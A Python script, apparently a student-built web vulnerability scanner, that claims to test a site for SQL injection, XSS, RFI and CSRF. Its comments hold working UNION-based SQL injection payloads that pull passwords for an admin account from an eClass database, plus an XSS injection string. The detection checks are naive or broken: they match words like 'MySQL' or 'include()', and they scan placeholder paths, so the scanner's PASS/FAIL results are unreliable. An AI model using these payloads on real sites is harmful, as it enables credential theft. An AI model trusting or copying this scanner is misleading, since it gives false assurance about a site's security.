import argparse
import requests
from bs4 import BeautifulSoup
from termcolor import colored

# function to detect SQL Injection in a vulnerable web application
def detect_sql_injection(url):

    """
        1. phpbb:
            a. reply
            b. viewtopic
            c. newtopic
        2. profile.php
        3. unregcours
        4. work
        5. ?search?
        6. 
    """

    # modules/unreguser/unregcours.php?cid=TMA100'AND 0=1 UNION SELECT password FROM eclass.user WHERE username="drunkadmin" or'a'='a &u=4
    # modules/phpbb/reply.php?topic=2 AND 13 = 12) UNION SELECT password, password, password, password FROM eclass.user -- &forum=1
    # modules/phpbb/viewtopic.php?topic=2 AND 13 = 12 ) UNION SELECT password, password FROM eclass.user WHERE username="drunkadmin" -- &forum=1
    # modules/unreguser/unregcours.php?cid=TMA100'AND 'f'='c' UNION SELECT password FROM eclass.user WHERE user_id='1' or'f'='s

    try:
        response = requests.get(url)
        if "MySQL" in response.text:
            print(colored("The URL parameter id is vulnerable to SQL Injection", "red"))
            return True
        else:
            print(colored("The URL parameter id is not vulnerable to SQL Injection", "green"))
            return False
    except requests.exceptions.RequestException as e:
        print(e)

# function to detect stored and reflected XSS in a vulnerable web application
def detect_xss(url):

    # modules/phpbb/viewtopic.php?topic=1) UNION SELECT "a","<script>alert('100')</script>" FROM forums f, topics t WHERE 1=1 OR (1=2 &forum=1
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find_all(string=["<script>", "alert(", "<img src=", "onerror=", "onclick=", "onload="]):
            print(colored("The URL is vulnerable to stored and reflected XSS", "red"))
            return True
        else:
            print(colored("The URL is not vulnerable to stored and reflected XSS", "green"))
            return False
    except requests.exceptions.RequestException as e:
        print(e)

# function to detect RFI in a vulnerable web application
def detect_rfi(url):
    try:
        response = requests.get(url)
        if "include()" in response.text:
            print(colored("The URL is vulnerable to RFI", "red"))
            return True
        else:
            print(colored("The URL is not vulnerable to RFI", "green"))
            return False
    except requests.exceptions.RequestException as e:
        print(e)

# function to detect CSRF in a vulnerable web application
def detect_csrf(url):
    try:
        response = requests.get(url)
        if "_MENIDI_" in response.text:
            print(colored("The URL is vulnerable to CSRF", "red"))
            return True
        else:
            print(colored("The URL is not vulnerable to CSRF", "green"))
            return False
    except requests.exceptions.RequestException as e:
        print(e)

def print_result(attack_name, result):
    if result:
        print(f"{attack_name}: {colored('FAIL', 'red')}")
    else:
        print(f"{attack_name}: {colored('PASS', 'green')}")

# SQL injection handler
def sql_injection_handler(url):
    paths = ['/index.php?id=1', '/main.php?path=whatever']

    for path in paths:
        endpoint_url = url.rstrip('/') + path
        result = detect_sql_injection(endpoint_url)
        print_result("SQL Injection", result)

# XSS handler
def xss_handler(url):
    paths = ['/example_xss_path']

    for path in paths:
        endpoint_url = url.rstrip('/') + path
        result = detect_xss(endpoint_url)
        print_result("XSS", result)

# RFI handler
def rfi_handler(url):
    paths = ['/example_rfi_path']

    for path in paths:
        endpoint_url = url.rstrip('/') + path
        result = detect_rfi(endpoint_url)
        print_result("RFI", result)

# CSRF handler
def csrf_handler(url):
    paths = ['/example_csrf_path']

    for path in paths:
        endpoint_url = url.rstrip('/') + path
        result = detect_csrf(endpoint_url)
        print_result("CSRF", result)

def main():
    parser = argparse.ArgumentParser(description='Check for security vulnerabilities in a web application')
    parser.add_argument('-u', '--url', required=True, help='the URL of the web page to check')
    parser.add_argument('-s', '--sqli', action='store_true', help='check for SQL injection vulnerabilities')
    parser.add_argument('-x', '--xss', action='store_true', help='check for XSS vulnerabilities')
    parser.add_argument('-r', '--rfi', action='store_true', help='check for RFI vulnerabilities')
    parser.add_argument('-c', '--csrf', action='store_true', help='check for CSRF vulnerabilities')
    args = parser.parse_args()

    if args.sqli:
        sql_injection_handler(args.url)
    if args.xss:
        xss_handler(args.url)
    if args.rfi:
        rfi_handler(args.url)
    if args.csrf:
        csrf_handler(args.url)

if __name__ == "__main__":
    main()
